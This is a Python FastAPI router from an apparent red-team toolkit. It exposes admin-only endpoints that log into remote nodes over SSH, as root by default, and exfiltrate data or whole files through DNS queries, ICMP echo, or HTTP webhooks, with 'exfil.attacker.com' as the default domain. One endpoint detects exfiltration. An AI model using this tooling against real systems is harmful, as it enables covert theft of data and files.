"""
Netrunner Exfiltration Router — API endpoints for data exfiltration testing.
"""

from fastapi import APIRouter, HTTPException, Depends
from pydantic import BaseModel
from typing import Optional
from .auth import require_admin
from ..core.exfiltration import (
    dns_exfiltrate,
    icmp_exfiltrate,
    http_exfiltrate,
    exfil_file,
    detect_exfiltration,
    get_exfil_methods,
)
from ..core.db import load_nodes_db

router = APIRouter()


class DNSExfilRequest(BaseModel):
    node_id: str
    data: str
    domain: str = "exfil.attacker.com"
    encoding: str = "base32"


class ICMPExfilRequest(BaseModel):
    node_id: str
    data: str
    target_ip: str
    encoding: str = "hex"


class HTTPExfilRequest(BaseModel):
    node_id: str
    data: str
    webhook_url: str
    encoding: str = "json"


class FileExfilRequest(BaseModel):
    node_id: str
    file_path: str
    method: str = "dns"
    domain: str = "exfil.attacker.com"
    target_ip: str = ""
    webhook_url: str = ""


class DetectRequest(BaseModel):
    node_id: str


@router.get("/exfil/methods")
async def api_exfil_methods():
    """List available exfiltration methods."""
    methods = get_exfil_methods()
    return {"methods": methods}


@router.post("/exfil/dns", dependencies=[Depends(require_admin)])
async def api_exfil_dns(req: DNSExfilRequest):
    """
    Exfiltrate data via DNS queries.

    ⚠️ Requires: Attacker-controlled DNS server pointing to your IP
    """
    nodes = await load_nodes_db()
    if req.node_id not in nodes:
        raise HTTPException(404, "Node not found")

    node = nodes[req.node_id]
    host = node.get("host", "")
    username, password = await _get_creds(req.node_id, node)

    if not password:
        raise HTTPException(400, "No SSH credentials")

    result = await dns_exfiltrate(
        req.node_id,
        host,
        username,
        password,
        req.data,
        req.domain,
        req.encoding,
    )
    if not result["success"]:
        raise HTTPException(400, result.get("error", result.get("output", "Failed")))
    return result


@router.post("/exfil/icmp", dependencies=[Depends(require_admin)])
async def api_exfil_icmp(req: ICMPExfilRequest):
    """
    Exfiltrate data via ICMP echo requests.

    ⚠️ Requires: Root access on node, raw socket capability
    """
    nodes = await load_nodes_db()
    if req.node_id not in nodes:
        raise HTTPException(404, "Node not found")

    node = nodes[req.node_id]
    host = node.get("host", "")
    username, password = await _get_creds(req.node_id, node)

    if not password:
        raise HTTPException(400, "No SSH credentials")

    result = await icmp_exfiltrate(
        req.node_id,
        host,
        username,
        password,
        req.data,
        req.target_ip,
        req.encoding,
    )
    if not result["success"]:
        raise HTTPException(400, result.get("error", result.get("output", "Failed")))
    return result


@router.post("/exfil/http", dependencies=[Depends(require_admin)])
async def api_exfil_http(req: HTTPExfilRequest):
    """
    Exfiltrate data via HTTP POST to a webhook.

    Use for Discord, Slack, or custom webhook endpoints.
    """
    nodes = await load_nodes_db()
    if req.node_id not in nodes:
        raise HTTPException(404, "Node not found")

    node = nodes[req.node_id]
    host = node.get("host", "")
    username, password = await _get_creds(req.node_id, node)

    if not password:
        raise HTTPException(400, "No SSH credentials")

    result = await http_exfiltrate(
        req.node_id,
        host,
        username,
        password,
        req.data,
        req.webhook_url,
        req.encoding,
    )
    if not result["success"]:
        raise HTTPException(400, result.get("error", result.get("output", "Failed")))
    return result


@router.post("/exfil/file", dependencies=[Depends(require_admin)])
async def api_exfil_file(req: FileExfilRequest):
    """
    Exfiltrate a file from a remote node.

    Reads the file, encodes it, and sends via chosen method.
    """
    nodes = await load_nodes_db()
    if req.node_id not in nodes:
        raise HTTPException(404, "Node not found")

    node = nodes[req.node_id]
    host = node.get("host", "")
    username, password = await _get_creds(req.node_id, node)

    if not password:
        raise HTTPException(400, "No SSH credentials")

    kwargs = {
        "domain": req.domain,
        "target_ip": req.target_ip,
        "webhook_url": req.webhook_url,
    }

    result = await exfil_file(
        req.node_id,
        host,
        username,
        password,
        req.file_path,
        req.method,
        **kwargs,
    )
    if not result["success"]:
        raise HTTPException(400, result.get("error", "Failed"))
    return result


@router.post("/exfil/detect", dependencies=[Depends(require_admin)])
async def api_exfil_detect(req: DetectRequest):
    """
    Detect potential data exfiltration on a node.

    Checks DNS patterns, ICMP traffic, connections, and running processes.
    """
    nodes = await load_nodes_db()
    if req.node_id not in nodes:
        raise HTTPException(404, "Node not found")

    node = nodes[req.node_id]
    host = node.get("host", "")
    username, password = await _get_creds(req.node_id, node)

    if not password:
        raise HTTPException(400, "No SSH credentials")

    result = await detect_exfiltration(req.node_id, host, username, password)
    return result


async def _get_creds(node_id: str, node: dict) -> tuple[str, str]:
    """Get SSH credentials from vault or node defaults."""
    username = "root"
    password = node.get("ssh_password", "")

    try:
        from ..core.vault import get_credential

        cred = await get_credential(node_id, "ssh")
        if cred:
            username = cred.get("username", username)
            password = cred.get("password", password)
    except Exception:
        pass

    return username, password
